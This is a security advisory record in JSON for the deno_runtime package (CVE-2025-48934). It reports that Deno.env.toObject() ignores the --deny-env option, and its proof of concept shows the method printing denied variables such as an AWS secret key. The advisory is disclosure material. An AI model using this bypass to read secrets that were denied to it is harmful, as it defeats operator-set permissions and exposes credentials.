{
  "Severity": "MODERATE",
  "UpdatedAt": "2025-06-04T21:18:19Z",
  "Package": {
    "Ecosystem": "RUST",
    "Name": "deno_runtime"
  },
  "Advisory": {
    "DatabaseId": 297549,
    "Id": "GSA_kwCzR0hTQS03dzhwLWNoeHEtMjc4Oc4ABIpN",
    "GhsaId": "GHSA-7w8p-chxq-2789",
    "References": [
      {
        "Url": "https://github.com/denoland/deno/security/advisories/GHSA-7w8p-chxq-2789"
      },
      {
        "Url": "https://github.com/denoland/deno/pull/29079"
      },
      {
        "Url": "https://github.com/denoland/deno/commit/2959e083912420988066a001c2b2d6732a1b562f"
      },
      {
        "Url": "https://github.com/denoland/deno/commit/946ccda1aa19a00c478a5e6826b75053b050d753"
      },
      {
        "Url": "https://docs.deno.com/api/deno/~/Deno.Env.toObject"
      },
      {
        "Url": "https://docs.deno.com/runtime/fundamentals/security/#environment-variables"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-48934"
      },
      {
        "Url": "https://github.com/advisories/GHSA-7w8p-chxq-2789"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-7w8p-chxq-2789"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2025-48934"
      }
    ],
    "Description": "### Summary\nThe [Deno.env.toObject](https://docs.deno.com/api/deno/~/Deno.Env.toObject) method ignores any variables listed in the `--deny-env` option of the `deno run` command. When looking at the [documentation](https://docs.deno.com/runtime/fundamentals/security/#environment-variables) of the `--deny-env` option this might lead to a false impression that variables listed in the option are impossible to read.\n\n### PoC\n\n```\nexport AWS_SECRET_ACCESS_KEY=my-secret-aws-key\n\n# Works as expected. The program stops with a \"NotCapable\" error message\necho 'console.log(Deno.env.get(\"AWS_SECRET_ACCESS_KEY\"));' | deno run \\\n  --allow-env \\\n  --deny-env=AWS_ACCESS_KEY_ID,AWS_SECRET_ACCESS_KEY -\n\n# All enviroment variables are printed and the --deny-env list is completely disregarded\necho 'console.log(Deno.env.toObject());' | deno run \\\n  --allow-env \\\n  --deny-env=AWS_ACCESS_KEY_ID,AWS_SECRET_ACCESS_KEY -\n```\n\nThe first example using `get` exits with the following error:\n```\nerror: Uncaught (in promise) NotCapable: Requires env access to \"AWS_SECRET_ACCESS_KEY\", run again with the --allow-env flag\nconsole.log(Deno.env.get(\"AWS_SECRET_ACCESS_KEY\"));\n                     ^\n    at Object.getEnv [as get] (ext:deno_os/30_os.js:124:10)\n    at file:///$deno$stdin.mts:1:22\n```\n\nThe second example  using `toObject` prints all environment variables:\n```\n[Object: null prototype] {\n  ...\n  AWS_SECRET_ACCESS_KEY: \"my-secret-aws-key\",\n  ...\n}\n```\n\n### Impact\nSoftware relying on the combination of both flags to allow access to most environment variables except a few sensitive ones will be vulnerable to malicious code trying to steal secrets using the Deno.env.toObject() method.",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-06-04T21:18:18Z",
    "Severity": "MODERATE",
    "Summary": "Deno.env.toObject() ignores the variables listed in --deny-env and returns all environment variables",
    "UpdatedAt": "2025-07-02T18:31:08Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 5.3,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "0.212.0"
      },
      "VulnerableVersionRange": "\u003c 0.212.0"
    }
  ]
}